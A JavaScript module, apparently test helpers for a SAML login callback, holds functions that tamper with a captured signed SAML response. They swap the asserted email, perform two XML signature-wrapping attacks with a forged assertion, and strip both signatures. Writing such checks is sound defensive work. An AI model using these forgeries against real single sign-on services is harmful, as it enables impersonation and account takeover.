// What an attacker does with a real signed SAML response they captured: edit
// it as text and post it again. Each function takes and returns the form body
// a browser posts to the callback (SAMLResponse and RelayState).
const decode = (body) => {
  const fields = new URLSearchParams(body);
  return {
    fields,
    xml: Buffer.from(fields.get('SAMLResponse'), 'base64').toString('utf8'),
  };
};
const encode = (fields, xml) => {
  const next = new URLSearchParams(fields);
  next.set('SAMLResponse', Buffer.from(xml, 'utf8').toString('base64'));
  return next.toString();
};
const element = (name) =>
  new RegExp(`<(\\w+:)?${name}\\b[\\s\\S]*?</\\1${name}>`, 'u');

/** The assertion's email attribute value, as the provider sent it. */
export function assertedEmail(body) {
  return /<(?:\w+:)?AttributeValue[^>]*>([^<@]+@[^<]+)</u.exec(
    decode(body).xml,
  )?.[1];
}

/** Changes the email inside the signed assertion, keeping every signature. */
export function replaceEmail(body, email) {
  const { fields, xml } = decode(body);
  const original = assertedEmail(body);
  return encode(fields, xml.split(original).join(email));
}

/** The response with its own signature removed: only the assertion stays signed. */
function withoutResponseSignature(xml) {
  const assertionAt = xml.search(element('Assertion'));
  const signature = element('Signature').exec(xml);
  if (signature === null || signature.index > assertionAt) return xml;
  return (
    xml.slice(0, signature.index) +
    xml.slice(signature.index + signature[0].length)
  );
}

/** A copy of the signed assertion naming `email`, with no signature and a new ID. */
function forgedAssertion(xml, email, original) {
  const [assertion] = element('Assertion').exec(xml);
  return assertion
    .replace(element('Signature'), '')
    .replace(/\bID="[^"]+"/u, 'ID="_forged0000000000000000000000000000"')
    .replace(
      /(<(\w+:)?NameID\b[^>]*>)[^<]+(<\/\2NameID>)/u,
      '$1forged-subject-0001$3',
    )
    .split(original)
    .join(email);
}

/**
 * Signature wrapping: the response signature removed, a forged assertion for
 * `email` placed first, and the genuine signed assertion kept after it.
 */
export function wrapForgedBefore(body, email) {
  const { fields, xml } = decode(body);
  const original = assertedEmail(body);
  const bare = withoutResponseSignature(xml);
  const match = element('Assertion').exec(bare);
  return encode(
    fields,
    bare.slice(0, match.index) +
      forgedAssertion(bare, email, original) +
      bare.slice(match.index),
  );
}

/**
 * Signature wrapping: the genuine signed assertion hidden inside the
 * response's Extensions, and a forged one for `email` in its place.
 */
export function wrapGenuineInExtensions(body, email) {
  const { fields, xml } = decode(body);
  const original = assertedEmail(body);
  const bare = withoutResponseSignature(xml);
  const match = element('Assertion').exec(bare);
  const protocol = /<(\w+:)?Response\b/u.exec(bare)[1] ?? '';
  const forged = forgedAssertion(bare, email, original);
  return encode(
    fields,
    bare.slice(0, match.index) +
      `<${protocol}Extensions>${match[0]}</${protocol}Extensions>` +
      forged +
      bare.slice(match.index + match[0].length),
  );
}

/** Both signatures removed: an unsigned response naming `email`. */
export function unsigned(body, email) {
  const { fields, xml } = decode(body);
  const original = assertedEmail(body);
  const bare = withoutResponseSignature(xml).replace(element('Signature'), '');
  return encode(fields, bare.split(original).join(email));
}
